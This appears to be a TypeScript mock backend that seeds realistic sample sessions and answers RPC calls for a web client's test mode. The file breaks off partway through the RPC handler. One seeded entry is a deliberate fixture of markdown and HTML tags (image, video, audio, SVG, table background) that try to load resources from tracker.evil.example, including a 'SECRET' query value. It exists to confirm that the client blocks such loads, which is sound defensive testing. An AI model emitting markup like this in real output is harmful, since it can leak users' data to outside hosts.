// Mock daemon: implements every contract method and event with realistic sample data. Dev/test only (VITE_MOCK=1).
import { LoginError, RpcError, UploadError } from '../api/rpc';
import type { EventSourceHandle, EventSourceHandlers, LoginResult, Transport, UploadHandle } from '../api/rpc';
import type {
	AttachmentResult, AttentionItemDto, AttentionKind, AttentionQuestionAnswer, AttentionQuestionDto, AttentionSummaryDto, EventFrame, SessionEntryDto, SessionStateDto, SessionTagDto, TagKind, TagRefDto,
	TreeDirectoryDto, TreeGroupDto, TreeSessionDto, UsageResult, EffortId,
} from '../api/types';
import { buildMockFiles, readChunk, sizeOf } from './files';
import type { MockFile } from './files';
import { ago, LONG_ENTRY_FULL, LONG_ENTRY_PREVIEW, LONG_MARKDOWN, makeAssistantEntry, makeUserEntry, SHORT_REPLIES, USER_PROMPTS, WIDE_TABLE } from './samples';

const WORK_PROFILE = 'Work (vitaly@datalabs.example)';
const SYS_PROFILE = '[Sys] vitaly@example.com';
const CHATGPT_PROFILE = 'ChatGPT · vitaly@example.com';
const CLAUDE_EFFORTS = [{ id: 'max' }, { id: 'high' }, { id: 'medium' }, { id: 'low' }];
const LATENCY_MS = 60;
const FETCH_DEFAULT = 50;
const FETCH_MAX = 200;

interface MockSession {
	id: string;
	name: string;
	dirId: string;
	groupId?: string;
	supervisorId?: string;
	favorite: boolean;
	streaming: boolean;
	running: boolean;
	hasDraft: boolean;
	hasSchedules: boolean;
	hidden: boolean;
	profileName: string;
	lastActivityMin: number | null;
	entries: SessionEntryDto[];
	epoch: number;
	attention: AttentionItemDto[];
	tags: SessionTagDto[];
	lastUsed: { modelId: string; effort: EffortId | string; profileId: string; profileName: string };
	fullEntries: Record<number, string>;
	/** FR.33: `codex` for a GPT session. */
	engine?: 'claude' | 'codex';
}

interface MockGroup { id: string; name: string; groups: MockGroup[]; expanded: boolean; sessionIds: string[] }
interface MockDir { id: string; label: string; expanded: boolean; groups: MockGroup[]; sessionIds: string[] }

const hex = (n: number) => n.toString(16).padStart(32, '0');
let idCounter = 0x1000;
const newId = () => hex(idCounter++);

type Listener = (f: EventFrame) => void;

export class MockDaemon {
	readonly dirs: MockDir[] = [];
	readonly sessions = new Map<string, MockSession>();
	online = true;
	treeVersion = 1;
	private listeners = new Set<Listener>();
	private attentionSeq = 1;
	liveId = '';
	private liveCount = 0;
	private files: Record<string, MockFile> = buildMockFiles();
	/** refId / preview handle -> file. */
	private fileRefs = new Map<string, MockFile>();
	private demoEntry: { session: MockSession; index: number; quote: string } | null = null;

	constructor() {
		this.seed();
		window.setInterval(() => this.liveTick(), 4000);
	}

	// ------------------------------------------------------------------ seeding
	private mk(partial: Partial<MockSession> & { name: string; dirId: string }): MockSession {
		const s: MockSession = {
			id: newId(), favorite: false, streaming: false, running: false, hasDraft: false, hasSchedules: false, hidden: false,
			profileName: WORK_PROFILE, lastActivityMin: null, entries: [], epoch: 0, attention: [], tags: [], fullEntries: {},
			lastUsed: { modelId: 'default', effort: 'default', profileId: 'default', profileName: 'Default' },
			...partial,
		};
		this.sessions.set(s.id, s);
		return s;
	}

	private shortTranscript(s: MockSession, n: number, topic: string): void {
		let idx = 0;
		const base = s.lastActivityMin ?? 5000;
		for (let i = 0; i < n; i++) {
			const t = base + (n - i) * 7;
			s.entries.push(makeUserEntry(idx++, t, `${USER_PROMPTS[i % USER_PROMPTS.length]} (${topic})`, s.profileName));
			s.entries.push(makeAssistantEntry(idx++, t - 3, `${SHORT_REPLIES[(i + topic.length) % SHORT_REPLIES.length]}\n\nTopic: **${topic}**.`, i % 2 ? 'claude-opus-5-5' : undefined, i % 2 ? 'high' : undefined));
		}
	}

	private seed(): void {
		const tessyn: MockDir = { id: newId(), label: 'Tessyn', expanded: true, groups: [], sessionIds: [] };
		const datalabs: MockDir = { id: newId(), label: 'DataLabs', expanded: true, groups: [], sessionIds: [] };
		const scratch: MockDir = { id: newId(), label: 'Scratch', expanded: false, groups: [], sessionIds: [] };
		const web: MockGroup = { id: newId(), name: 'Web client', groups: [], expanded: true, sessionIds: [] };
		const spa: MockGroup = { id: newId(), name: 'SPA', groups: [], expanded: true, sessionIds: [] };
		web.groups.push(spa);
		const perf: MockGroup = { id: newId(), name: 'Perf diagnostics', groups: [], expanded: false, sessionIds: [] };
		tessyn.groups.push(web, perf);
		const imp: MockGroup = { id: newId(), name: 'Importer', groups: [], expanded: true, sessionIds: [] };
		const graf: MockGroup = { id: newId(), name: 'Grafana', groups: [], expanded: false, sessionIds: [] };
		datalabs.groups.push(imp, graf);
		this.dirs.push(tessyn, datalabs, scratch);

		const put = (c: { sessionIds: string[] }, dir: MockDir, group: MockGroup | undefined, s: Partial<MockSession> & { name: string }, topic: string, pairs = 3): MockSession => {
			const rec = this.mk({ ...s, dirId: dir.id, groupId: group?.id });
			if (rec.entries.length === 0) this.shortTranscript(rec, pairs, topic);
			c.sessionIds.push(rec.id);
			return rec;
		};

		// --- the long, markdown-rich transcript session (opened in the screenshots)
		const long = put(spa, tessyn, spa, {
			name: 'Web client - SPA design', lastActivityMin: 4, favorite: true, hasDraft: false, profileName: WORK_PROFILE,
			lastUsed: { modelId: 'claude-opus-5-5', effort: 'high', profileId: 'work', profileName: WORK_PROFILE },
			tags: [
				{ kind: 'linearIssue', label: 'TES-142', url: 'https://linear.app/example/issue/TES-142', source: 'session' },
				{ kind: 'gitHubPullRequest', label: 'tessyn#58', url: 'https://github.com/example/tessyn/pull/58', source: 'name' },
			],
		}, 'spa', 0);
		this.buildLongTranscript(long);

		// --- a GPT session on the ChatGPT profile (FR.33)
		put(tessyn, tessyn, undefined, {
			name: 'GPT session: tidy the changelog', lastActivityMin: 8, profileName: CHATGPT_PROFILE, engine: 'codex',
			lastUsed: { modelId: 'gpt-6.2-sol', effort: 'xhigh', profileId: 'codex_1', profileName: CHATGPT_PROFILE },
		}, 'gpt', 1);

		// --- a running session that appends entries every few seconds
		const live = put(tessyn, tessyn, undefined, { name: 'Live: nightly import monitor', lastActivityMin: 1, running: true, streaming: true }, 'monitor', 2);
		this.liveId = live.id;

		// --- supervisor with workers
		const sup = put(tessyn, tessyn, undefined, { name: 'Orchestrate WPF rewrite', lastActivityMin: 12, favorite: true, profileName: SYS_PROFILE }, 'wpf', 4);
		const workerNames = ['Worker: models', 'Worker: view-models', 'Worker: styles', 'Worker: tests'];
		workerNames.forEach((w, i) => {
			// the first two workers run now: the supervisor row shows the active workers badge (FR.1.28)
			const rec = this.mk({ name: w, dirId: tessyn.id, groupId: undefined, supervisorId: sup.id, lastActivityMin: 20 + i * 9, running: i < 2 });
			this.shortTranscript(rec, 2, w);
			tessyn.sessionIds.push(rec.id);
		});

		// --- attention items of every kind
		const att = put(tessyn, tessyn, undefined, { name: 'Needs your decision', lastActivityMin: 35, lastUsed: { modelId: 'default', effort: 'medium', profileId: 'default', profileName: 'Default' } }, 'attention', 2);
		const critical = this.addAttention(att, 'critical', 'Production database migration is blocked', 'The migration `0042_add_tags` failed on the staging replica.\n\nI have **stopped** before touching production.', [], undefined);
		const retry = this.addAttention(att, 'ask', 'Which retry policy should the relay use?', 'Two options are viable. Exponential backoff is the usual choice, but the link cap of 30 s is the main constraint.\n\n| Option | Max wait |\n|---|---|\n| Linear | 60 s |\n| Exponential | 30 s |', ['Exponential backoff', 'Linear backoff', 'Fixed 5 s'], 'Exponential backoff');
		this.seedRefs(att, long, critical, retry);
		this.addAttention(att, 'ask', 'Rename `CMX` MCP prefix now?', 'The planned Tessyn-branded rename touches skills and headers.', ['Yes, now', 'Later'], 'Later');
		this.addAttention(att, 'todo', 'Update docs/glossary.md with the Web client terms', 'Add: *Relay*, *Link*, *Remote method*.', [], undefined);
		this.addAttention(att, 'alert', 'Usage window resets in 20 minutes', undefined, [], undefined);
		this.addAttention(att, 'decided', 'Use SSE rather than WebSocket for browser events', 'Decided in the architecture review: proxies and mobile networks cope better with SSE.', [], undefined);
		const closed1 = this.addAttention(att, 'ask', 'Should the tree remember expansion?', 'Client-side only.', ['Yes', 'No'], 'Yes');
		closed1.status = 'answered'; closed1.answer = 'Yes - keep it in localStorage'; closed1.closedUtc = ago(300);
		const closed2 = this.addAttention(att, 'todo', 'Add the Tags tab', undefined, [], undefined);
		closed2.status = 'resolved'; closed2.resolutionNote = 'Implemented in efe49b7'; closed2.closedUtc = ago(900);
		const closed3 = this.addAttention(att, 'alert', 'Disk space low on the build machine', undefined, [], undefined);
		closed3.status = 'dismissed'; closed3.closedUtc = ago(1200);

		const att2 = put(imp, datalabs, imp, { name: 'Importer: schema drift', lastActivityMin: 150 }, 'schema', 2);
		this.seedNestedRef(this.addAttention(att2, 'ask', 'Drop the legacy column?', 'The column `Legacy_Id` has no readers left.', ['Drop it', 'Keep it'], 'Drop it'));

		// --- an approved elevated run (FR.23.41, FR.23.42): in progress, so it shows in the Running group and counts nowhere
		const elev = this.addAttention(att2, 'ask', 'Run the WPF E2E suite as the test user', 'Needs the elevated shell.', [], undefined);
		elev.action = {
			type: 'elevatedRun',
			run: {
				id: 'er-mock-1', status: 'running', requester: { nodeId: att2.id, name: att2.name, shortId: att2.id.slice(0, 8) }, reason: 'Run the WPF E2E suite as the test user',
				workingDirName: 'Tessyn-wt-elevruns', command: 'powershell -File tools\e2e\Run-WpfE2E.ps1', timeoutMinutes: 60,
				createdUtc: ago(20), expiresUtc: ago(-10), startedUtc: ago(5),
			},
		};

		// --- a questionnaire item (FR.23.33): all four question types, recommendations filled in, a long choice for wrapping
		const plan = this.addAttention(att2, 'ask', 'Approve the schema migration plan?', 'Plan: add `Tag` columns, backfill, then drop `Legacy_Id`.', [], undefined);
		plan.questions = [
			{ number: 1, type: 'yesNo', text: 'Run the backfill during business hours?', choices: [], recommended: 'no', recommendedChoices: [] },
			{ number: 2, type: 'single', text: 'Which rollout order?', choices: ['Staging first', 'Production first', 'Both at once, with a very long label that has to wrap on a phone screen'], recommended: 'Staging first', recommendedChoices: [] },
			{ number: 3, type: 'multi', text: 'Which tables to include?', choices: ['Products', 'Orders', 'Customers', 'Audit log'], recommendedChoices: ['Products', 'Orders'] },
			{ number: 4, type: 'text', text: 'Anything to add to the rollback plan?', choices: [], recommended: 'Keep the snapshot for 7 days.', recommendedChoices: [] },
			{ number: 5, type: 'yesNo', text: 'Notify the data team?', choices: [], recommendedChoices: [] },
		];

		// --- tree filler with a spread of recency
		const filler: Array<[string, MockDir, MockGroup | undefined, number | null, Partial<MockSession>?]> = [
			['Fix flaky E2E for focus view', tessyn, web, 25, { hasDraft: true }],
			['Relay connector backoff', tessyn, web, 70],
			['Server: cookie auth review', tessyn, web, 210],
			['Perf: memory snapshot analysis', tessyn, perf, 600, { favorite: true }],
			['Perf: UI thread hotspots', tessyn, perf, 1300],
			['Perf: JSONL count off UI thread', tessyn, perf, 2900],
			['Glossary cleanup', tessyn, undefined, 1500, { hasSchedules: true }],
			['Phase 38 todo grooming', tessyn, undefined, 4000],
			['Telegram bridge retirement', tessyn, undefined, 8000],
			['Importer: nopCommerce mapping', datalabs, imp, 45, { hasDraft: true }],
			['Importer: retry on 429', datalabs, imp, 300],
			['Importer: dedupe SKU', datalabs, imp, 2000],
			['Grafana: slow requests dashboard', datalabs, graf, 520],
			['Grafana: Loki label cleanup', datalabs, graf, 3000],
			['SQL: index review', datalabs, undefined, 90],
			['Semantic search backfill', datalabs, undefined, 6000, { hasSchedules: true }],
			['HubSpot sync investigation', datalabs, undefined, 12000],
			['Scratch: regex experiments', scratch, undefined, 30000],
			['Scratch: PWA icon sketch', scratch, undefined, 90],
			['Scratch: unit conversion', scratch, undefined, null],
			['Linear triage notes', datalabs, undefined, 15000],
			['Release checklist', tessyn, undefined, 20000],
			['Explore: ClaudeMaximus rename', tessyn, undefined, 700],
			['Explore: DPAPI config store', tessyn, undefined, 1000],
			['Wide table rendering test', tessyn, spa, 100],
		];
		for (const [name, dir, group, age, extra] of filler) {
			const rec = put(group ?? dir, dir, group, { name, lastActivityMin: age, ...(extra ?? {}) }, name.toLowerCase(), 2);
			if (name.startsWith('Wide table')) rec.entries.push(makeAssistantEntry(rec.entries.length, 100, WIDE_TABLE));
		}
		// --- portrait overflow stress session: deep location, 8 real-shaped tags, long URLs/tokens, wide table, long focus cards
		const stressGroup: MockGroup = { id: newId(), name: 'QuickBooksSQL / Development / Some Deep Group', groups: [], expanded: true, sessionIds: [] };
		scratch.groups.push(stressGroup);
		const stress = put(stressGroup, scratch, stressGroup, { name: 'HSE-225 portrait stress: block built-in tools for the very long named session', lastActivityMin: 3 }, 'stress', 1);
		for (const [kind, label, url] of [
			['linearIssue', 'HSE-225', 'https://linear.app/hardstop/issue/HSE-225'],
			['gitHubPullRequest', 'backend-v1 PR #198', 'https://github.com/hardstop/backend-v1/pull/198'],
			['gitHubPullRequest', 'windows-app PR #288', 'https://github.com/hardstop/windows-app/pull/288'],
			['gitHubPullRequest', 'frontend-v1 PR #1021', 'https://github.com/hardstop/frontend-v1/pull/1021'],
			['gitHubRepository', 'frontend-v1', 'https://github.com/hardstop/frontend-v1'],
			['gitHubRepository', 'backend-v1', 'https://github.com/hardstop/backend-v1'],
			['gitHubRepository', 'windows-app', 'https://github.com/hardstop/windows-app'],
			['linearIssue', 'HSE-286-block-built-in-tools-and-hooks-for-every-agent-type-in-the-pipeline', 'https://linear.app/hardstop/issue/HSE-286'],
		] as [TagKind, string, string][]) stress.tags.push({ kind, label, url, source: 'session' });
		stress.entries.push(
			makeUserEntry(stress.entries.length, 12, `See https://linear.app/hardstop/issue/HSE-286/block-built-in-tools-and-hooks-for-every-agent-type-in-the-pipeline-v2-extended and ${'A'.repeat(120)}`),
			makeAssistantEntry(stress.entries.length + 1, 11, `Long URL: https://github.com/hardstop/backend-v1/pull/198/files#diff-0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef and token ${'x'.repeat(140)}

Inline \`${'code_identifier_'.repeat(8)}\` here.

- list item with https://example.com/${'seg/'.repeat(40)}

> quote ${'q'.repeat(100)}

# Heading ${'H'.repeat(80)}

\`\`\`
${'const veryLongLine = 1; '.repeat(12)}
\`\`\`

| Nowrap header one | Nowrap header two | Nowrap header three | Nowrap header four |
|---|---|---|---|
| a | b | c | d |`),
		);
		this.addAttention(stress, 'ask', `Which of https://linear.app/hardstop/issue/HSE-286/block-built-in-tools-and-hooks-for-every-agent-type ${'T'.repeat(60)} to use?`, `Body ${'B'.repeat(120)} https://example.com/${'p/'.repeat(60)}

\`${'inline_'.repeat(20)}\``, ['An option with a really long label that goes on and on and on and on', `Unbroken${'O'.repeat(90)}`], 'An option with a really long label that goes on and on and on and on');
		// tags on a few sessions (Tags tab)
		const tagOf = (kind: TagKind, label: string, url: string): SessionTagDto => ({ kind, label, url, source: 'session' });
		const byName = (n: string) => [...this.sessions.values()].find((s) => s.name === n)!;
		byName('Relay connector backoff').tags.push(tagOf('linearIssue', 'TES-142', 'https://linear.app/example/issue/TES-142'), tagOf('gitHubPullRequest', 'tessyn#58', 'https://github.com/example/tessyn/pull/58'));
		byName('Server: cookie auth review').tags.push(tagOf('linearIssue', 'TES-143', 'https://linear.app/example/issue/TES-143'));
		byName('Fix flaky E2E for focus view').tags.push(tagOf('gitHubRepository', 'example/tessyn', 'https://github.com/example/tessyn'));
		byName('Importer: nopCommerce mapping').tags.push(tagOf('linearIssue', 'DL-901', 'https://linear.app/example/issue/DL-901'));
		byName('Importer: retry on 429').tags.push(tagOf('linearIssue', 'DL-901', 'https://linear.app/example/issue/DL-901'), tagOf('linearIssue', 'DL-877', 'https://linear.app/example/issue/DL-877'));
		byName('SQL: index review').tags.push(tagOf('linearIssue', 'DL-877', 'https://linear.app/example/issue/DL-877'));
		// a long truncated entry
		const t = byName('Importer: dedupe SKU');
		t.entries.push(makeAssistantEntry(t.entries.length, 2000, LONG_ENTRY_PREVIEW));
		t.entries[t.entries.length - 1].truncated = true;
		t.entries[t.entries.length - 1].fullLength = LONG_ENTRY_FULL.length;
		t.fullEntries[t.entries.length - 1] = LONG_ENTRY_FULL;
	}

	/** Focus refs, file handles and an assistant entry with local paths and media links (the "Needs your decision" session). */
	private seedRefs(att: MockSession, long: MockSession, critical: AttentionItemDto, retry: AttentionItemDto): void {
		const QUOTE = 'Migration touches exactly 3 tables';
		att.entries.push(makeAssistantEntry(att.entries.length, 40,
			`${QUOTE}: Tags, TagLinks and SessionTags. I wrote the plan to \`C:\\Users\\vvino\\Plans\\plan.md\` and my notes to C:\\Projects\\Personal\\Tessyn\\docs\\notes.txt.\n\n`
			+ 'Snapshot of the result: https://annielartens.online/results/sample-1.png and a clip https://cdn.example.org/media/clip.mp4 (not on the allowlist).\n\n'
			+ 'Also: C:\\Temp\\photo.png, C:\\Temp\\diagram.svg, C:\\Temp\\report.html, C:\\Temp\\clip.mp4, C:\\Temp\\report.pdf, C:\\Temp\\huge.mp4 and c:/temp/Greeter.cs.'));
		const entryIdx = att.entries.length - 1;
		const rec = (key: string) => { const f = this.files[key]; const refId = newId(); this.fileRefs.set(refId, f); return { refId, f }; };
		const plan = rec('plan.md');
		const photo = rec('photo.png');
		const huge = rec('huge.mp4');
		const pdf = rec('report.pdf');
		critical.refs = [
			{ kind: 'entry', label: 'The 3 affected tables', nodeId: att.id, fileId: this.fileIdOf(att), entryId: this.entryIdOf(att, entryIdx), offset: 0, length: QUOTE.length },
			{ kind: 'file', label: 'Migration plan', refId: plan.refId, name: plan.f.name, path: 'docs/plan.md', size: sizeOf(plan.f), mime: plan.f.mime, mtimeUtc: ago(50) },
			{ kind: 'file', refId: photo.refId, name: photo.f.name, path: 'out/photo.png', size: sizeOf(photo.f), mime: photo.f.mime },
			{ kind: 'file', label: 'Report (PDF)', refId: pdf.refId, name: pdf.f.name, size: sizeOf(pdf.f), mime: pdf.f.mime },
			{ kind: 'file', label: 'Full recording', refId: huge.refId, name: huge.f.name, size: sizeOf(huge.f), mime: huge.f.mime },
			{ kind: 'url', label: 'Runbook', url: 'https://example.com/runbook' },
		];
		const target = 'typed JSON-RPC client plus an SSE event stream';
		const longEntry = long.entries[1];
		retry.refs = [
			{ kind: 'entry', label: 'Design discussion in the SPA session', nodeId: long.id, fileId: this.fileIdOf(long), entryId: this.entryIdOf(long, 1), offset: longEntry.content.indexOf(target), length: target.length },
		];
		// An entry whose markdown tries every way of making the browser load a remote resource without a click (none may be requested).
		att.entries.push(makeAssistantEntry(att.entries.length, 30,
			'Remote-load attempts: ![secret](https://tracker.evil.example/md?d=SECRET) <img src="https://tracker.evil.example/raw?d=1" srcset="https://tracker.evil.example/set 2x"> '
			+ '<video src="https://tracker.evil.example/v" poster="https://tracker.evil.example/poster"></video> <audio src="https://tracker.evil.example/a"></audio> '
			+ '<svg><image href="https://tracker.evil.example/svg"/></svg> <table background="https://tracker.evil.example/bg"><tr><td>cell</td></tr></table>'));
		this.demoEntry = { session: att, index: entryIdx, quote: QUOTE };
	}

	/** The Importer session's Focus item refs into the "Needs your decision" session: Focus -> entry -> Focus -> entry gives a nested Back stack. */
	private seedNestedRef(item: AttentionItemDto): void {
		const d = this.demoEntry!;
		item.refs = [{ kind: 'entry', label: 'Affected tables (other session)', nodeId: d.session.id, fileId: this.fileIdOf(d.session), entryId: this.entryIdOf(d.session, d.index), offset: 0, length: d.quote.length }];
	}

	private fileIdOf(s: MockSession): string { return `${s.id.slice(0, 24)}${s.epoch.toString(16).padStart(8, '0')}`; }
	private entryIdOf(s: MockSession, index: number): string { return `${this.fileIdOf(s)}:${index}`; }

	private buildLongTranscript(s: MockSession): void {
		let i = 0;
		const push = (e: SessionEntryDto) => { s.entries.push({ ...e, index: i++ }); };
		for (let round = 0; round < 24; round++) {
			const t = 400 - round * 15;
			push(makeUserEntry(0, t, round === 0 ? 'Design the web client for Tessyn. It must be mobile-first.' : USER_PROMPTS[round % USER_PROMPTS.length], WORK_PROFILE));
			if (round % 7 === 3) push({ index: 0, timestamp: ago(t - 1), role: 'system', content: '[Tool: Read] docs/requirements.md' });
			push(makeAssistantEntry(0, t - 2, round === 0 ? LONG_MARKDOWN : round === 5 ? WIDE_TABLE : SHORT_REPLIES[round % SHORT_REPLIES.length], 'claude-opus-5-5', 'high'));
			if (round === 10) push({ index: 0, timestamp: ago(t - 3), role: 'compaction', content: '' });
			if (round === 12) push({ index: 0, timestamp: ago(t - 3), role: 'assistant', content: '   ' });
		}
		push(makeUserEntry(0, 9, 'What is left before we can ship?', WORK_PROFILE));
		push(makeAssistantEntry(0, 4, 'Only the Playwright flows and the **service worker** are left. Everything else is in place.', 'claude-opus-5-5', 'high'));
	}

	private addAttention(s: MockSession, kind: AttentionKind, title: string, body: string | undefined, options: string[], recommendation: string | undefined): AttentionItemDto {
		const n = this.attentionSeq++;
		const item: AttentionItemDto = {
			id: `att${n}`, number: n, kind, title, body, options, recommendation, status: 'open', createdUtc: ago(60 + n), updatedUtc: ago(30 + n),
		};
		s.attention.push(item);
		return item;
	}

	// ------------------------------------------------------------------ DTO builders
	private inProgress(a: AttentionItemDto): boolean {
		const status = a.action?.type === 'elevatedRun' ? a.action.run?.status : undefined;
		return status === 'launching' || status === 'running';
	}

	private summary(s: MockSession): AttentionSummaryDto {
		const order: AttentionKind[] = ['critical', 'ask', 'todo', 'alert', 'decided'];
		const open = s.attention.filter((a) => a.status === 'open');
		const top = (items: AttentionItemDto[]) => order.find((k) => items.some((i) => i.kind === k));
		const nonDecided = open.filter((a) => a.kind !== 'decided' && !this.inProgress(a));
		const counted = open.filter((a) => !this.inProgress(a)); // FR.23.41: an approved elevated run is not counted anywhere
		return { openCount: nonDecided.length, topKind: top(nonDecided), allOpenCount: counted.length, allOpenTopKind: top(counted) };
	}

	private lastPromptMin(s: MockSession): number | null {
		const u = [...s.entries].reverse().find((e) => e.role === 'user');
		return u ? (Date.now() - Date.parse(u.timestamp)) / 60000 : null;
	}

	stateOf(s: MockSession): SessionStateDto {
		const sum = this.summary(s);
		const lp = this.lastPromptMin(s);
		const state: SessionStateDto = {
			id: s.id, running: s.running, streamingAlive: s.streaming && s.running, favorite: s.favorite, hasDraft: s.hasDraft,
			profileName: s.profileName,
		};
		if (s.engine) state.engine = s.engine;
		const runningWorkers = this.runningWorkerCount(s.id);
		if (runningWorkers > 0) state.runningWorkerCount = runningWorkers;
		if (sum.allOpenCount > 0 && sum.allOpenTopKind) state.attention = { count: sum.allOpenCount, topKind: sum.allOpenTopKind };
		if (s.lastActivityMin !== null) state.lastActivityUtc = ago(s.lastActivityMin);
		if (lp !== null) state.lastPromptUtc = ago(lp);
		return state;
	}

	private treeSession(s: MockSession): TreeSessionDto {
		const dto: TreeSessionDto = { id: s.id, name: s.name, workerCount: this.workersOf(s.id).length, state: this.stateOf(s) };
		if (s.supervisorId) dto.supervisorId = s.supervisorId;
		return dto;
	}

	private workersOf(id: string): MockSession[] {
		return [...this.sessions.values()].filter((w) => w.supervisorId === id);
	}

	/** Workers running right now, direct and nested (the session itself is not counted). */
	private runningWorkerCount(id: string): number {
		return this.workersOf(id).reduce((n, w) => n + (w.running ? 1 : 0) + this.runningWorkerCount(w.id), 0);
	}

	private isTopLevel(s: MockSession): boolean {
		return !s.supervisorId || !this.sessions.has(s.supervisorId);
	}

	private groupDto(g: MockGroup): TreeGroupDto {
		return {
			id: g.id, name: g.name, isExpanded: g.expanded,
			groups: g.groups.map((x) => this.groupDto(x)),
			sessions: g.sessionIds.map((id) => this.sessions.get(id)!).filter((s) => this.isTopLevel(s)).map((s) => this.treeSession(s)),
		};
	}

	private dirDto(d: MockDir): TreeDirectoryDto {
		return {
			id: d.id, label: d.label, isExpanded: d.expanded,
			groups: d.groups.map((g) => this.groupDto(g)),
			sessions: d.sessionIds.map((id) => this.sessions.get(id)!).filter((s) => this.isTopLevel(s)).map((s) => this.treeSession(s)),
		};
	}

	private dirOf(s: MockSession): MockDir { return this.dirs.find((d) => d.id === s.dirId)!; }
	private topLevel(): MockSession[] { return [...this.sessions.values()].filter((s) => this.isTopLevel(s)); }

	private treePath(s: MockSession): string {
		const dir = this.dirOf(s);
		const find = (groups: MockGroup[], trail: string[]): string[] | null => {
			for (const g of groups) {
				const t = [...trail, g.name];
				if (g.id === s.groupId) return t;
				const r = find(g.groups, t);
				if (r) return r;
			}
			return null;
		};
		const trail = s.groupId ? find(dir.groups, []) ?? [] : [];
		return [...trail, s.name].join(' / ');
	}

	private get(id: unknown): MockSession {
		const s = typeof id === 'string' ? this.sessions.get(id) : undefined;
		if (!s) throw new RpcError(-32000, 'Session not found');
		return s;
	}

	// ------------------------------------------------------------------ events
	subscribe(l: Listener): () => void { this.listeners.add(l); return () => { this.listeners.delete(l); }; }

	emit(method: string, params?: unknown): void {
		const frame: EventFrame = { method, params };
		window.setTimeout(() => { if (this.online || method === 'link.status') for (const l of [...this.listeners]) l(frame); }, 0);
	}

	private applyCompaction(s: MockSession): void {
		s.entries = [{ index: 0, timestamp: new Date().toISOString(), role: 'compaction', content: '' }, makeAssistantEntry(1, 0, '**Summary of the conversation so far**\n\n- Designed the web client\n- Agreed on SSE', 'claude-opus-5-5', 'high')];
		s.epoch++;
	}

	/** Test hook: compacts the named session without telling the client (it is offline), so only a resync can notice. */
	compactSilently(name: string): void {
		const s = [...this.sessions.values()].find((x) => x.name === name);
		if (!s) throw new Error(`No mock session named ${name}`);
		this.applyCompaction(s);
	}

	setOnline(online: boolean): void {
		this.online = online;
		this.emit('link.status', { online, since: new Date().toISOString() });
	}

	private touch(s: MockSession): void {
		s.lastActivityMin = 0;
		this.emit('session.changed', { state: this.stateOf(s) });
		// a worker starting or stopping changes the badge of every supervisor above it
		for (let sup = s.supervisorId ? this.sessions.get(s.supervisorId) : undefined; sup; sup = sup.supervisorId ? this.sessions.get(sup.supervisorId) : undefined)
			this.emit('session.changed', { state: this.stateOf(sup) });
	}

	private appendEntry(s: MockSession, e: Omit<SessionEntryDto, 'index'>): void {
		s.entries.push({ ...e, index: s.entries.length });
		this.emit('session.appended', { nodeId: s.id, epoch: s.epoch });
		this.touch(s);
	}

	private liveTick(): void {
		const s = this.sessions.get(this.liveId);
		if (!s || !s.running) return;
		this.liveCount++;
		this.appendEntry(s, {
			timestamp: new Date().toISOString(), role: 'assistant', modelId: 'claude-opus-5-5', effort: 'medium',
			content: `Import batch **#${this.liveCount}** finished: \`${(1200 + this.liveCount * 37)}\` rows, 0 errors.\n\n- warnings: ${this.liveCount % 3}\n- elapsed: ${(this.liveCount * 1.3).toFixed(1)} s`,
		});
	}

	private runTurn(s: MockSession, text: string): boolean {
		const queued = s.running;
		const delay = queued ? 3000 : 500;
		window.setTimeout(() => {
			this.appendEntry(s, { timestamp: new Date().toISOString(), role: 'user', content: text, profileName: s.lastUsed.profileName === 'Default' ? SYS_PROFILE : s.lastUsed.profileName });
			s.running = true;
			this.touch(s);
			window.setTimeout(() => {
				this.appendEntry(s, {
					timestamp: new Date().toISOString(), role: 'assistant', modelId: s.lastUsed.modelId === 'default' ? undefined : s.lastUsed.modelId,
					effort: s.lastUsed.effort === 'default' ? undefined : s.lastUsed.effort,
					content: `Got it - working on: _${text.slice(0, 60)}_.\n\n\`\`\`bash\nnpm test -- --run\n\`\`\`\n\nAll **green**.`,
				});
				if (s.id !== this.liveId) s.running = false;
				this.touch(s);
				this.emit('turn.completed', { nodeId: s.id, cancelled: false });
			}, 3500);
		}, delay);
		return queued;
	}

	// ------------------------------------------------------------------ RPC
	handle(method: string, params: Record<string, unknown>): unknown {
		if (!this.online && method !== 'client.hello') throw new RpcError(-32001, 'Desktop offline');
		switch (method) {
			case 'client.hello': return {
				protocolVersion: 1, daemonVersion: 'mock-1.0', machineName: 'MOCK-PC', runId: 'mock-run', serverTimeUtc: new Date().toISOString(),
				capabilities: ['engines'], engines: ['claude', 'codex'],
				codex: { found: true, version: '0.172.0', testedVersion: '0.171', note: 'Codex 0.172.0 is newer than the tested 0.171.x. It should work; report anything odd.' },
			};
			case 'tree.snapshot': return { version: this.treeVersion, directories: this.dirs.map((d) => this.dirDto(d)) };
			case 'tree.workers': return { supervisorId: params.supervisorId, workers: this.workersOf(String(params.supervisorId)).map((w) => this.treeSession(w)) };
			case 'tree.search': return this.search(params);
			case 'tree.createSession': return this.createSession(params);
			case 'recent.list': return this.recentList();
			case 'recent.hide': return this.recentHide(params);
			case 'tags.search': return this.tagsSearch(params);
			case 'session.get': return this.sessionGet(params);
			case 'session.entries': return this.sessionEntries(params);
			case 'session.entry': return this.sessionEntry(params);
			case 'session.send': {
				const s = this.get(params.nodeId);
				this.applyPick(s, params);
				return { accepted: true, queued: this.runTurn(s, String(params.text ?? '')) };
			}
			case 'session.stop': {
				const s = this.get(params.nodeId);
				const was = s.running;
				s.running = false;
				this.touch(s);
				return { stopped: was };
			}
			case 'session.compact': {
				const s = this.get(params.nodeId);
				const queued = s.running;
				window.setTimeout(() => {
					this.applyCompaction(s);
					this.emit('session.reset', { nodeId: s.id, epoch: s.epoch });
					this.touch(s);
				}, 800);
				return { accepted: true, queued };
			}
			case 'session.setFavorite': {
				const s = this.get(params.nodeId);
				s.favorite = Boolean(params.value);
				this.touch(s);
				return { value: s.favorite };
			}
			case 'session.setStreaming': {
				const s = this.get(params.nodeId);
				const enabled = Boolean(params.enabled);
				if (!enabled && s.streaming && s.running && !params.force) return { enabled: s.streaming, needsConfirm: true };
				s.streaming = enabled;
				this.touch(s);
				return { enabled, needsConfirm: false };
			}
			case 'attention.list': {
				const s = this.get(params.nodeId);
				return { nodeId: s.id, summary: this.summary(s), items: this.orderedAttention(s) };
			}
			case 'file.read': return this.fileRead(params);
			case 'file.preview': return this.filePreview(params);
			case 'attention.reply': return this.attentionReply(params);
			case 'attention.dismiss': {
				const s = this.get(params.nodeId);
				const item = s.attention.find((a) => a.id === params.itemId);
				if (!item || item.status !== 'open') return { dismissed: false };
				item.status = 'dismissed';
